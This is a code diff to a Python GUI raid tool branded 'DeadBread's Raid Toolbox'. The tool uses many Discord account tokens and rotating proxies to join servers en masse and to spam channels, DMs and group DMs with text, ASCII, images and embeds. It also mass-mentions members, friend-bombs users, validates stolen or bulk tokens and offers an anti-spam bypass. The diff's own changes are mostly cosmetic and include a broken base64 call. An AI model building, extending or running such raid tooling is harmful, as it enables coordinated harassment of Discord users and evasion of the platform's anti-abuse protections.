@@ -355,6 +355,11 @@ python_command = sys.argv[2]
 command_line_mode = int(sys.argv[3])
 thread_count = sys.argv[4]
 theme = ast.literal_eval(sys.argv[5])
+try:
+    rtb_icon = base64.base64encode(open("./RTBFiles/rtb_icon.png", "rb").read())
+except Exception as e:
+    print(e)
+    rtb_icon = b''
 
 with open('./config.json', 'r') as handle:
     config = json.load(handle)
@@ -437,6 +442,22 @@ def asciigen(length):
         asc = asc + chr(num)
     return asc
 
+def get_mime(data):
+    if data.startswith(b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'):
+        return 'image/png'
+    elif data[6:10] in (b'JFIF', b'Exif'):
+        return 'image/jpeg'
+    elif data.startswith((b'\x47\x49\x46\x38\x37\x61', b'\x47\x49\x46\x38\x39\x61')):
+        return 'image/gif'
+    elif data.startswith(b'RIFF') and data[8:12] == b'WEBP':
+        return 'image/webp'
+
+def bytes_to_base64_data(data):
+    fmt = 'data:{mime};base64,{data}'
+    mime = get_mime(data)
+    b64 = base64.b64encode(data).decode('ascii')
+    return fmt.format(mime=mime, data=b64)
+
 def write_error(token, message, code):
     print(f"Token {token[:24]}... Error: {message} (Code {code})")
 
@@ -445,10 +466,11 @@ if mode == 'joiner':
     def join(token,link,widget):
         global successfully
         headers, proxies = setup_request(token)
+        request = requests.Session()
         if widget:
             while True:
                 try:
-                    src = requests.get(f"https://canary.discordapp.com/api/guilds/{link}/widget.json", proxies=proxies, timeout=10)
+                    src = request.get(f"https://canary.discordapp.com/api/guilds/{link}/widget.json", proxies=proxies, timeout=10)
                 except Exception:
                     if use_proxies == 1:
                         proxies = request_new_proxy()
@@ -461,7 +483,7 @@ if mode == 'joiner':
                 link = widgson['instant_invite'][37:]
             except Exception:
                 sys.exit()
-            src = requests.post("https://canary.discordapp.com/api/v6/invite/{}".format(str(link)), headers=headers)
+            src = request.post(f"https://canary.discordapp.com/api/v6/invite/{link}", headers=headers)
             if src.status_code == 401:
                 error = json.loads(src.content)
                 write_error(token, error['message'], error['code'])
@@ -476,7 +498,7 @@ if mode == 'joiner':
                 sys.exit()
             successfully.append(token)
         else:
-            src = requests.post("https://canary.discordapp.com/api/v6/invite/{}".format(str(link)), headers=headers)
+            src = request.post(f"https://canary.discordapp.com/api/v6/invite/{link}", headers=headers)
             if src.status_code == 401:
                 error = json.loads(src.content)
                 write_error(token, error['message'], error['code'])
@@ -495,7 +517,7 @@ if mode == 'joiner':
             [sg.Text('Enter Invite to join.'), sg.InputText(size=(42,1), key="Invite"),sg.Button('Join',button_color=theme['button_colour'],size=(10,1))],
             [sg.Text('Delay'), sg.Combo(['0','1','3','5','10','60'], key="Delay"), sg.Checkbox('Log Info', tooltip='Log Info of server to text file.',size=(8,1), key="LogInfo"), sg.Checkbox('Widget joiner (Requires Server ID)', key="Widget"), sg.Text('Tokens:', size=(6,1)), sg.Combo([i for i in range(1,len(tokenlist)+1)], readonly=True, default_value=len(tokenlist), size=(2,1), tooltip="Number of tokens to join.", key="Limit")],
         ]
-        window = sg.Window('RTB | Joiner', layout, keep_on_top=True)
+        window = sg.Window('RTB | Joiner', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         link = values["Invite"]
@@ -547,7 +569,7 @@ if mode == 'joiner':
                 [sg.Text('Tokens Joined Successfully: {}'.format(len(successfully)))],
                 [sg.Button('kthxbye',button_color=theme['button_colour'],size=(15,1)), sg.Button('Export Tokens',button_color=theme['button_colour'],size=(15,1))]
             ]
-            window = sg.Window('RTB | Joiner Results', layout, keep_on_top=True)
+            window = sg.Window('RTB | Joiner Results', layout, keep_on_top=True, icon=rtb_icon)
             event, values = window.Read()
             window.Close()
             if event == "Export Tokens":
@@ -561,9 +583,10 @@ if mode == 'joiner':
 elif mode == 'leaver':
     def leave(token, ID):
         headers, proxies = setup_request(token)
+        request = requests.Session()
         while True:
             try:
-                requests.delete(f"https://canary.discordapp.com/api/v6/users/@me/guilds/{ID}", headers=headers, proxies=proxies, timeout=10)
+                request.delete(f"https://canary.discordapp.com/api/v6/users/@me/guilds/{ID}", headers=headers, proxies=proxies, timeout=10)
             except Exception:
                 if use_proxies == 1:
                     proxies = request_new_proxy()
@@ -588,7 +611,7 @@ elif mode == 'leaver':
         layout = [
             [sg.Text('Enter server ID to leave.'), sg.InputText(size=(30,1), key="ID"),sg.RButton('Leave',button_color=theme['button_colour'],size=(10,1))]
         ]
-        window = sg.Window('RTB | Leaver', layout, keep_on_top=True)
+        window = sg.Window('RTB | Leaver', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         ID = values["ID"]
@@ -604,9 +627,10 @@ elif mode == 'leaver':
 elif mode == 'groupleaver':
     def grleave(token,ID):
         headers, proxies = setup_request(token)
+        request = requests.Session()
         while True:
             try:
-                requests.delete(f"https://canary.discordapp.com/api/v6/channels/{ID}", headers=headers, proxies=proxies, timeout=10)
+                request.delete(f"https://canary.discordapp.com/api/v6/channels/{ID}", headers=headers, proxies=proxies, timeout=10)
             except Exception:
                 if use_proxies == 1:
                     proxies = request_new_proxy()
@@ -631,7 +655,7 @@ elif mode == 'groupleaver':
         layout = [
             [sg.Text('Enter Group ID to leave.'), sg.InputText(size=(30,1), key="ID"),sg.RButton('Leave',button_color=theme['button_colour'],size=(10,1))]
         ]
-        window = sg.Window('RTB | Group DM Leaver', layout, keep_on_top=True)
+        window = sg.Window('RTB | Group DM Leaver', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         ID = values["ID"]
@@ -654,9 +678,10 @@ elif mode == "checker":
         global ilist
         global vlist
         headers, proxies = setup_request(token)
+        request = requests.Session()
         while True:
             try:
-                src = requests.get(f'https://canary.discordapp.com/api/v6/applications/trending/global', headers=headers, proxies=proxies, timeout=10)
+                src = request.get(f'https://canary.discordapp.com/api/v6/applications/trending/global', headers=headers, proxies=proxies, timeout=10)
             except Exception:
                 if use_proxies == 1:
                     proxies = request_new_proxy()
@@ -682,7 +707,7 @@ elif mode == "checker":
         [sg.Multiline(vlist, size=(70,20), key="Valid", disabled=True), sg.Multiline(vlist, size=(70,20), key="Invalid", disabled=True)],
         [sg.RButton('Save valid tokens',button_color=theme['button_colour'],size=(15,1)), sg.RButton('Stop Checking',button_color=theme['button_colour'],size=(15,1))]
     ]
-    window = sg.Window(f'RTB | Checker [{len(validtokens)} Valid] [{len(phonelocked)} Phone Locked] [{len(invalidtokens)} Invalid]', layout, keep_on_top=True)
+    window = sg.Window(f'RTB | Checker [{len(validtokens)} Valid] [{len(phonelocked)} Phone Locked] [{len(invalidtokens)} Invalid]', layout, keep_on_top=True, icon=rtb_icon)
     for token in tokenlist:
         executor.submit(check, token)
     while True:
@@ -714,9 +739,10 @@ elif mode == "checkerV2":
     printed = []
     def checkv2(token):
         headers, proxies = setup_request(token)
+        request = requests.Session()
         while True:
             try:
-                src = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers, proxies=proxies, timeout=10)
+                src = request.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers, proxies=proxies, timeout=10)
             except Exception:
                 if use_proxies == 1:
                     proxies = request_new_proxy()
@@ -731,7 +757,7 @@ elif mode == "checkerV2":
             response = json.loads(src.content.decode())
             while True:
                 try:
-                    src = requests.get('https://canary.discordapp.com/api/v6/applications/trending/global', headers=headers, proxies=proxies, timeout=10)
+                    src = request.get('https://canary.discordapp.com/api/v6/applications/trending/global', headers=headers, proxies=proxies, timeout=10)
                 except Exception:
                     if use_proxies == 1:
                         proxies = request_new_proxy()
@@ -766,7 +792,7 @@ elif mode == "checkerV2":
     ]
     for token in tokenlist:
         executor.submit(checkv2, token)
-    window = sg.Window(f'RTB | Checker V2 [{len(verifiedtokens)} Verified] [{len(unverifiedtokens)} Unverified] [{len(phonelocked)} Phone Locked] [{len(invalidtokens)} Invalid]', layout, keep_on_top=True)
+    window = sg.Window(f'RTB | Checker V2 [{len(verifiedtokens)} Verified] [{len(unverifiedtokens)} Unverified] [{len(phonelocked)} Phone Locked] [{len(invalidtokens)} Invalid]', layout, keep_on_top=True, icon=rtb_icon)
     while True:
         event, values = window.Read(timeout=10)
         if event == sg.TIMEOUT_KEY:
@@ -801,11 +827,12 @@ elif mode == "checkerV2":
 elif mode == 'messagespam':
     def sendmessage(token, text, channel, server, emojispam, antispambypass):
         headers, proxies = setup_request(token)
+        request = requests.Session()
         if emojispam:
             text += " "
             while True:
                 try:
-                    src = requests.get(f"https://canary.discordapp.com/api/v6/guilds/{server}/emojis", headers=headers, proxies=proxies, timeout=10)
+                    src = request.get(f"https://canary.discordapp.com/api/v6/guilds/{server}/emojis", headers=headers, proxies=proxies, timeout=10)
                 except Exception:
                     if use_proxies == 1:
                         proxies = request_new_proxy()
@@ -821,7 +848,7 @@ elif mode == 'messagespam':
             if channel == 'all':
                 while True:
                     try:
-                        chanjson = requests.get(f"https://canary.discordapp.com/api/v6/guilds/{server}/channels",headers=headers, proxies=proxies, timeout=10)
+                        chanjson = request.get(f"https://canary.discordapp.com/api/v6/guilds/{server}/channels",headers=headers, proxies=proxies, timeout=10)
                     except Exception:
                         if use_proxies == 1:
                             proxies = request_new_proxy()
@@ -855,7 +882,7 @@ elif mode == 'messagespam':
                             for m in [text[i:i+1999] for i in range(0, len(text), 1999)]:
                                 while True:
                                     try:
-                                        src = requests.post(f"https://canary.discordapp.com/api/v6/channels/{channel['id']}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
+                                        src = request.post(f"https://canary.discordapp.com/api/v6/channels/{channel['id']}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                                     except Exception:
                                         if use_proxies == 1:
                                             proxies = request_new_proxy()
@@ -887,7 +914,7 @@ elif mode == 'messagespam':
                     for m in [text[i:i+1999] for i in range(0, len(text), 1999)]:
                         while True:
                             try:
-                                src = requests.post(f"https://canary.discordapp.com/api/v6/channels/{channel}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
+                                src = request.post(f"https://canary.discordapp.com/api/v6/channels/{channel}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                             except Exception:
                                 if use_proxies == 1:
                                     proxies = request_new_proxy()
@@ -913,7 +940,7 @@ elif mode == 'messagespam':
             if channel == 'all':
                 while True:
                     try:
-                        chanjson = requests.get(f"https://canary.discordapp.com/api/v6/guilds/{server}/channels",headers=headers, proxies=proxies, timeout=10)
+                        chanjson = request.get(f"https://canary.discordapp.com/api/v6/guilds/{server}/channels",headers=headers, proxies=proxies, timeout=10)
                     except Exception:
                         if use_proxies == 1:
                             proxies = request_new_proxy()
@@ -934,7 +961,7 @@ elif mode == 'messagespam':
                         else:
                             while True:
                                 try:
-                                    src = requests.post(f"https://canary.discordapp.com/api/v6/channels/{channel['id']}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
+                                    src = request.post(f"https://canary.discordapp.com/api/v6/channels/{channel['id']}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                                 except Exception:
                                     if use_proxies == 1:
                                         proxies = request_new_proxy()
@@ -966,7 +993,7 @@ elif mode == 'messagespam':
                     payload = {"content": text, "tts": False}
                     while True:
                         try:
-                            src = requests.post(f"https://canary.discordapp.com/api/v6/channels/{channel}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
+                            src = request.post(f"https://canary.discordapp.com/api/v6/channels/{channel}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                         except Exception:
                             if use_proxies == 1:
                                 proxies = request_new_proxy()
@@ -996,7 +1023,7 @@ elif mode == 'messagespam':
             [sg.Text('Server ID', size=(15, 1)), sg.Input(key="Server")],
             [sg.Button('Start',button_color=theme['button_colour'],size=(10,1)),sg.Checkbox("Append Emoji Spam",tooltip="Add Emoji Spam to message, message can be empty.", key="SpamEmoji"), sg.Checkbox("Anti-Spam Bypass",tooltip="Attempts to bypass anti-spam bots", key="Bypass")]
         ]
-        window = sg.Window('RTB | Message Spammer', layout, keep_on_top=True)
+        window = sg.Window('RTB | Message Spammer', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -1020,10 +1047,11 @@ elif mode == 'messagespam':
 elif mode == 'asciispam':
     def sendascii(token,channel,server):
         headers, proxies = setup_request(token)
+        request = requests.Session()
         if channel == 'all':
             while True:
                 try:
-                    src = requests.get(f"https://canary.discordapp.com/api/v6/guilds/{server}/channels",headers=headers, proxies=proxies, timeout=10)
+                    src = request.get(f"https://canary.discordapp.com/api/v6/guilds/{server}/channels",headers=headers, proxies=proxies, timeout=10)
                 except Exception:
                     if use_proxies == 1:
                         proxies = request_new_proxy()
@@ -1052,7 +1080,7 @@ elif mode == 'asciispam':
                     else:
                         while True:
                             try:
-                                src = requests.post(f"https://canary.discordapp.com/api/v6/channels/{channel['id']}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
+                                src = request.post(f"https://canary.discordapp.com/api/v6/channels/{channel['id']}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                             except Exception:
                                 if use_proxies == 1:
                                     proxies = request_new_proxy()
@@ -1080,7 +1108,7 @@ elif mode == 'asciispam':
                 payload = {"content": asciigen(1999), "tts": False}
                 while True:
                     try:
-                        src = requests.post(f"https://canary.discordapp.com/api/v6/channels/{channel}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
+                        src = request.post(f"https://canary.discordapp.com/api/v6/channels/{channel}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                     except Exception:
                         if use_proxies == 1:
                             proxies = request_new_proxy()
@@ -1109,7 +1137,7 @@ elif mode == 'asciispam':
             [sg.Text('Server ID', size=(15, 1)), sg.Input(key="Server")],
             [sg.Button('Start',button_color=theme['button_colour'],size=(10,1))]
         ]
-        window = sg.Window('RTB | Ascii Spammer', layout, keep_on_top=True)
+        window = sg.Window('RTB | Ascii Spammer', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -1127,11 +1155,12 @@ elif mode == 'asciispam':
 elif mode == 'massmention':
     def sendmention(token,channel,server):
         headers, proxies = setup_request(token)
+        request = requests.Session()
         memberlist = []
         msg = ''
         while True:
             try:
-                src = requests.get(f"https://canary.discordapp.com/api/v6/guilds/{server}/members?limit=1000",headers=headers, proxies=proxies, timeout=10)
+                src = request.get(f"https://canary.discordapp.com/api/v6/guilds/{server}/members?limit=1000",headers=headers, proxies=proxies, timeout=10)
             except Exception:
                 if use_proxies == 1:
                     proxies = request_new_proxy()
@@ -1159,7 +1188,7 @@ elif mode == 'massmention':
         if channel == 'all':
             while True:
                 try:
-                    src = requests.get(f"https://canary.discordapp.com/api/v6/guilds/{server}/channels",headers=headers, proxies=proxies, timeout=10)
+                    src = request.get(f"https://canary.discordapp.com/api/v6/guilds/{server}/channels",headers=headers, proxies=proxies, timeout=10)
                 except Exception:
                     if use_proxies == 1:
                         proxies = request_new_proxy()
@@ -1189,7 +1218,7 @@ elif mode == 'massmention':
                             payload = {"content" : m, "tts" : False}
                             while True:
                                 try:
-                                    src = requests.post(f"https://canary.discordapp.com/api/v6/channels/{channel['id']}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
+                                    src = request.post(f"https://canary.discordapp.com/api/v6/channels/{channel['id']}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                                 except Exception:
                                     if use_proxies == 1:
                                         proxies = request_new_proxy()
@@ -1217,7 +1246,7 @@ elif mode == 'massmention':
                     payload = {"content": m, "tts": False}
                     while True:
                         try:
-                            src = requests.post(f"https://canary.discordapp.com/api/v6/channels/{channel}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
+                            src = request.post(f"https://canary.discordapp.com/api/v6/channels/{channel}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                         except Exception:
                             if use_proxies == 1:
                                 proxies = request_new_proxy()
@@ -1245,7 +1274,7 @@ elif mode == 'massmention':
             [sg.Text('Channel ID', size=(15, 1)), sg.InputText('all', key="Channel")],
             [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
         ]
-        window = sg.Window('RTB | Mass Mentioner', layout, keep_on_top=True)
+        window = sg.Window('RTB | Mass Mentioner', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -1278,7 +1307,7 @@ elif mode == 'vcspam':
             [sg.Text('Ammount of Tokens', size=(15, 1)), sg.Slider(range=(1,len(tokenlist)), key="Count", default_value=len(tokenlist), size=(29,15), orientation='horizontal', font=('Helvetica', 10), text_color=(theme['slider_text_color']))],
             [sg.Button('Start',button_color=theme['button_colour'],size=(10,1))]
         ]
-        window = sg.Window('RTB | Voice Chat Spammer', layout, keep_on_top=True)
+        window = sg.Window('RTB | Voice Chat Spammer', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -1321,8 +1350,9 @@ elif mode == 'vcspam':
 elif mode == 'dmspammer':
     def dmspammer(token, userid, text, ascii):
         headers, proxies = setup_request(token)
+        request = requests.Session()
         payload = {'recipient_id': userid}
-        src = requests.post('https://canary.discordapp.com/api/v6/users/@me/channels', headers=headers, json=payload, proxies=proxies, timeout=10)
+        src = request.post('https://canary.discordapp.com/api/v6/users/@me/channels', headers=headers, json=payload, proxies=proxies, timeout=10)
         dm_json = json.loads(src.content)
         if ascii:
             payload = {"content": asciigen(1999), "tts": False}
@@ -1331,7 +1361,7 @@ elif mode == 'dmspammer':
         while True:
             while True:
                 try:
-                    src = requests.post(f"https://canary.discordapp.com/api/v6/channels/{dm_json['id']}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
+                    src = request.post(f"https://canary.discordapp.com/api/v6/channels/{dm_json['id']}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                 except Exception:
                     if use_proxies == 1:
                         proxies = request_new_proxy()
@@ -1361,7 +1391,7 @@ elif mode == 'dmspammer':
             [sg.Text('Text to spam', size=(15, 1)), sg.Input(key="SpamText"), sg.Checkbox('Ascii?', tooltip='Spam with Ascii instead of text.', key="Ascii")],
             [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
         ]
-        window = sg.Window('RTB | DM Spammer', layout, keep_on_top=True)
+        window = sg.Window('RTB | DM Spammer', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -1384,14 +1414,15 @@ elif mode == 'dmspammer':
 elif mode == 'friender':
     def friend(token, userid):
         headers, proxies = setup_request(token)
+        request = requests.Session()
         while True:
             try:
                 if "#" in userid:
                     user = userid.split("#")
                     payload = {"username": user[0], "discriminator": user[1]}
-                    src = requests.post('https://canary.discordapp.com/api/v6/users/@me/relationships', headers=headers,json=payload, proxies=proxies, timeout=10)
+                    src = request.post('https://canary.discordapp.com/api/v6/users/@me/relationships', headers=headers,json=payload, proxies=proxies, timeout=10)
                 else:
-                    src = requests.put(f'https://canary.discordapp.com/api/v6/users/@me/relationships/{userid}', headers=headers, proxies=proxies, timeout=10)
+                    src = request.put(f'https://canary.discordapp.com/api/v6/users/@me/relationships/{userid}', headers=headers, proxies=proxies, timeout=10)
             except Exception:
                 if use_proxies == 1:
                     proxies = request_new_proxy()
@@ -1417,7 +1448,7 @@ elif mode == 'friender':
             [sg.Input(key="User")],
             [sg.Button('Start',button_color=theme['button_colour'],size=(10,1))]
         ]
-        window = sg.Window('RTB | Friend Bomber', layout, keep_on_top=True)
+        window = sg.Window('RTB | Friend Bomber', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -1433,13 +1464,14 @@ elif mode == 'friender':
 elif mode == 'groupdmspam':
     def sendgdm(token, text, group, ascii):
         headers, proxies = setup_request(token)
+        request = requests.Session()
         payload = {"content": text, "tts": False}
         while True:
             if ascii:
                 payload = {"content": asciigen(1999), "tts": False}
             while True:
                 try:
-                    src = requests.post(f"https://canary.discordapp.com/api/v6/channels/{group}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
+                    src = request.post(f"https://canary.discordapp.com/api/v6/channels/{group}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                 except Exception:
                     if use_proxies == 1:
                         proxies = request_new_proxy()
@@ -1468,7 +1500,7 @@ elif mode == 'groupdmspam':
             [sg.Text('Group ID', size=(15, 1)), sg.Input(key="GroupID")],
             [sg.Button('Start',button_color=theme['button_colour'],size=(10,1))]
         ]
-        window = sg.Window('RTB | Group DM Spammer', layout, keep_on_top=True)
+        window = sg.Window('RTB | Group DM Spammer', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -1491,11 +1523,12 @@ elif mode == 'groupdmspam':
 elif mode == 'imagespam':
     def sendimages(token, channel, server, folder, text):
         headers, proxies = setup_request(token)
+        request = requests.Session()
         del headers['Content-Type']
         if channel == 'all':
             while True:
                 try:
-                    src = requests.get(f"https://canary.discordapp.com/api/v6/guilds/{server}/channels", headers=headers, proxies=proxies, timeout=10)
+                    src = request.get(f"https://canary.discordapp.com/api/v6/guilds/{server}/channels", headers=headers, proxies=proxies, timeout=10)
                 except Exception:
                     if use_proxies == 1:
                         proxies = request_new_proxy()
@@ -1519,7 +1552,7 @@ elif mode == 'imagespam':
                     else:
                         while True:
                             try:
-                                src = requests.post(f"https://canary.discordapp.com/api/v6/channels/{channel['id']}/messages", headers=headers, files=files, proxies=proxies, timeout=20)
+                                src = request.post(f"https://canary.discordapp.com/api/v6/channels/{channel['id']}/messages", headers=headers, files=files, proxies=proxies, timeout=20)
                                 print(src.text)
                             except Exception:
                                 if use_proxies == 1:
@@ -1553,7 +1586,7 @@ elif mode == 'imagespam':
                     files['payload_json'] = (None, json.dumps({'content': text}))
                 while True:
                     try:
-                        src = requests.post(f"https://canary.discordapp.com/api/v6/channels/{channel}/messages", headers=headers, files=files, proxies=proxies, timeout=20)
+                        src = request.post(f"https://canary.discordapp.com/api/v6/channels/{channel}/messages", headers=headers, files=files, proxies=proxies, timeout=20)
                         print(src.text)
                     except Exception as e:
                         print(e)
@@ -1585,7 +1618,7 @@ elif mode == 'imagespam':
             [sg.Text('Server ID', size=(15, 1)), sg.Input(key="ServerID")],
             [sg.Button('Start', button_color=theme['button_colour'], size=(10,1))]
         ]
-        window = sg.Window('RTB | Random Image Spammer', layout, keep_on_top=True)
+        window = sg.Window('RTB | Random Image Spammer', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -1670,7 +1703,7 @@ elif mode == 'gamechange':
             [sg.Combo(['Playing', 'Streaming', 'Watching', 'Listening to'], size=(10, 1), default_value='Playing', readonly=True, key="Type"), sg.InputText('osu!',size=(10, 1), key="Activity"),sg.Combo(['online', 'dnd', 'idle','random'], size=(10, 1), default_value='online', readonly=True, key="Status")],
             [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
         ]
-        window = sg.Window('RTB | Status Changer', layout, keep_on_top=True)
+        window = sg.Window('RTB | Status Changer', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -1690,6 +1723,7 @@ elif mode == 'gamechange':
 elif mode == 'nickname':
     def nickname(token,server,name,type):
         headers, proxies = setup_request(token)
+        request = requests.Session()
         if type == "Cycle":
             n = []
             for x in name.rstrip():
@@ -1703,7 +1737,7 @@ elif mode == 'nickname':
                 payload = {'nick': newnick}
                 while True:
                     try:
-                        src = requests.patch(f'https://canary.discordapp.com/api/v6/guilds/{server}/members/@me/nick', headers=headers, json=payload, proxies=proxies, timeout=10)
+                        src = request.patch(f'https://canary.discordapp.com/api/v6/guilds/{server}/members/@me/nick', headers=headers, json=payload, proxies=proxies, timeout=10)
                     except Exception:
                         if use_proxies == 1:
                             proxies = request_new_proxy()
@@ -1733,7 +1767,7 @@ elif mode == 'nickname':
                 payload = {'nick': asciigen(32)}
                 while True:
                     try:
-                        src = requests.patch(f'https://canary.discordapp.com/api/v6/guilds/{server}/members/@me/nick', headers=headers, json=payload, proxies=proxies, timeout=10)
+                        src = request.patch(f'https://canary.discordapp.com/api/v6/guilds/{server}/members/@me/nick', headers=headers, json=payload, proxies=proxies, timeout=10)
                     except Exception:
                         if use_proxies == 1:
                             proxies = request_new_proxy()
@@ -1762,7 +1796,7 @@ elif mode == 'nickname':
             payload = {'nick': name}
             while True:
                 try:
-                    src = requests.patch(f'https://canary.discordapp.com/api/v6/guilds/{server}/members/@me/nick', headers=headers, json=payload, proxies=proxies, timeout=10)
+                    src = request.patch(f'https://canary.discordapp.com/api/v6/guilds/{server}/members/@me/nick', headers=headers, json=payload, proxies=proxies, timeout=10)
                 except Exception:
                     if use_proxies == 1:
                         proxies = request_new_proxy()
@@ -1792,7 +1826,7 @@ elif mode == 'nickname':
             [sg.Combo(['Cycle','Ascii','Set'], size=(14, 5), default_value='Cycle', readonly=True, key="Type"), sg.Input("DeadBread's Raid Toolbox", tooltip="New Nickname", key="Nick")],
             [sg.Button('Start', button_color=theme['button_colour'], size=(10,1))]
         ]
-        window = sg.Window('RTB | Nickname Changer', layout, keep_on_top=True)
+        window = sg.Window('RTB | Nickname Changer', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -1812,6 +1846,7 @@ elif mode == 'nickname':
 elif mode == 'embed':
     def embedspam(token, channel, server, title, author, iconurl, field_name, field_value, imgurl, footer):
         headers, proxies = setup_request(token)
+        request = requests.Session()
         payload = {
             "content": '',
             "embed": {
@@ -1840,7 +1875,7 @@ elif mode == 'embed':
         if channel == 'all':
             while True:
                 try:
-                    chanjson = requests.get(f"https://canary.discordapp.com/api/v6/guilds/{server}/channels", headers=headers, proxies=proxies, timeout=10)
+                    chanjson = request.get(f"https://canary.discordapp.com/api/v6/guilds/{server}/channels", headers=headers, proxies=proxies, timeout=10)
                 except Exception:
                     if use_proxies == 1:
                         proxies = request_new_proxy()
@@ -1856,7 +1891,7 @@ elif mode == 'embed':
                     else:
                         while True:
                             try:
-                                src = requests.post(f"https://canary.discordapp.com/api/v6/channels/{channel['id']}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
+                                src = request.post(f"https://canary.discordapp.com/api/v6/channels/{channel['id']}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                             except Exception:
                                 if use_proxies == 1:
                                     proxies = request_new_proxy()
@@ -1882,7 +1917,7 @@ elif mode == 'embed':
             while True:
                 while True:
                     try:
-                        src = requests.post(f"https://canary.discordapp.com/api/v6/channels/{channel}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
+                        src = request.post(f"https://canary.discordapp.com/api/v6/channels/{channel}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                     except Exception:
                         if use_proxies == 1:
                             proxies = request_new_proxy()
@@ -1916,7 +1951,7 @@ elif mode == 'embed':
         [sg.Text('Footer Text', size=(10, 1)), sg.Input(key="FooterText")],
         [sg.Button('Start', button_color=theme['button_colour'], size=(10,1))]
     ]
-    window = sg.Window('RTB | Embed Spammer', layout, keep_on_top=True)
+    window = sg.Window('RTB | Embed Spammer', layout, keep_on_top=True, icon=rtb_icon)
     event, values = window.Read()
     window.Close()
     if event == "Start":
@@ -1936,29 +1971,12 @@ elif mode == 'embed':
         executor.submit(embedspam, token, channel, server, title, author, iconurl, field_name, field_value, imgurl, footer)
 
 elif mode == 'avatarchange':
-    from base64 import b64encode
-    # Ripped from Discord.py
-    def get_mime(data):
-        if data.startswith(b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'):
-            return 'image/png'
-        elif data[6:10] in (b'JFIF', b'Exif'):
-            return 'image/jpeg'
-        elif data.startswith((b'\x47\x49\x46\x38\x37\x61', b'\x47\x49\x46\x38\x39\x61')):
-            return 'image/gif'
-        elif data.startswith(b'RIFF') and data[8:12] == b'WEBP':
-            return 'image/webp'
-    # Ripped from Discord.py
-    def bytes_to_base64_data(data):
-        fmt = 'data:{mime};base64,{data}'
-        mime = get_mime(data)
-        b64 = b64encode(data).decode('ascii')
-        return fmt.format(mime=mime, data=b64)
-
     def changeavatar(token, avatarfile):
         headers, proxies = setup_request(token)
+        request = requests.Session()
         while True:
             try:
-                src = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers, proxies=proxies, timeout=10)
+                src = request.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers, proxies=proxies, timeout=10)
             except Exception:
                 if use_proxies == 1:
                     proxies = request_new_proxy()
@@ -1995,7 +2013,7 @@ elif mode == 'avatarchange':
         }
         while True:
             try:
-                src = requests.patch('https://canary.discordapp.com/api/v6/users/@me', headers=headers, json=payload, proxies=proxies, timeout=20)
+                src = request.patch('https://canary.discordapp.com/api/v6/users/@me', headers=headers, json=payload, proxies=proxies, timeout=20)
             except Exception:
                 if use_proxies == 1:
                     proxies = request_new_proxy()
@@ -2025,7 +2043,7 @@ elif mode == 'avatarchange':
         [sg.Text('Random Avatars (Folder)',size=(20,1), key="RandomText"), sg.Input(key="AvatarRandom"), sg.FolderBrowse(button_color=theme['button_colour'], key="Folderbrowse")],
         [sg.Button('Start',button_color=theme['button_colour'],size=(10,1)), sg.Combo(['Single', 'Random'], key="Type", readonly=True)]
     ]
-    window = sg.Window('RTB | Avatar Changer', layout, keep_on_top=True)
+    window = sg.Window('RTB | Avatar Changer', layout, keep_on_top=True, icon=rtb_icon)
     while True:
         event, values = window.Read(timeout=100)
         if event == "Start":
@@ -2057,11 +2075,12 @@ elif mode == 'avatarchange':
 elif mode == "rolemention":
     def sendrolemention(token, channel, server):
         headers, proxies = setup_request(token)
+        request = requests.Session()
         rolelist = []
         msg = ''
         while True:
             try:
-                roles = requests.get("https://canary.discordapp.com/api/v6/guilds/{server}/roles",headers=headers, proxies=proxies, timeout=10)
